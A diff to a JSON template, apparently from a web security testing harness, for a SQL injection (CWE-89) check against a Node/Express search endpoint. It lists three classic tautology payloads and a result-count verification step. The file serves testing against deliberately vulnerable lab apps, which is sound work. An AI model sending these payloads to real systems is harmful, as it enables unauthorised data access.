@@ -1,17 +1,55 @@
 {
   "templateId": "sqli-like-tautology",
   "sessionRole": "public",
-  "fixtures": ["vul-web2-daehan", "vul-web2-wonchang"],
-  "attackType": { "name": "sql_injection", "cwe": "CWE-89" },
-  "dependency": { "runtime": "node", "framework": "express", "library": "node:sqlite" },
-  "target": { "method": "GET", "endpoint": "/api/search" },
-  "request": { "packet": { "method": "GET", "path": "/api/search", "query": { "q": "{{payload}}" } } },
-  "blanks": {
-    "origin": { "required": true, "type": "url", "desc": "Trusted server-side target origin" },
-    "payload": { "required": true, "type": "string", "pickFrom": "payloads" }
+  "attackType": {
+    "name": "sql_injection",
+    "cwe": "CWE-89"
   },
-  "payloads": ["' OR '1'='1", "' OR 1=1--", "%' OR '1'='1"],
-  "verify": { "mode": "resultCount", "baseline": { "q": "zzqnomatch", "expect": 0 }, "attack": { "expectMin": 1 } },
+  "dependency": {
+    "runtime": "node",
+    "framework": "express",
+    "library": "node:sqlite"
+  },
+  "target": {
+    "method": "GET",
+    "endpoint": "/api/search"
+  },
+  "request": {
+    "packet": {
+      "method": "GET",
+      "path": "/api/search",
+      "query": {
+        "q": "{{payload}}"
+      }
+    }
+  },
+  "blanks": {
+    "origin": {
+      "required": true,
+      "type": "url",
+      "desc": "Trusted server-side target origin"
+    },
+    "payload": {
+      "required": true,
+      "type": "string",
+      "pickFrom": "payloads"
+    }
+  },
+  "payloads": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "%' OR '1'='1"
+  ],
+  "verify": {
+    "mode": "resultCount",
+    "baseline": {
+      "q": "zzqnomatch",
+      "expect": 0
+    },
+    "attack": {
+      "expectMin": 1
+    }
+  },
   "executor": "guardrail",
   "trust": "unverified"
 }
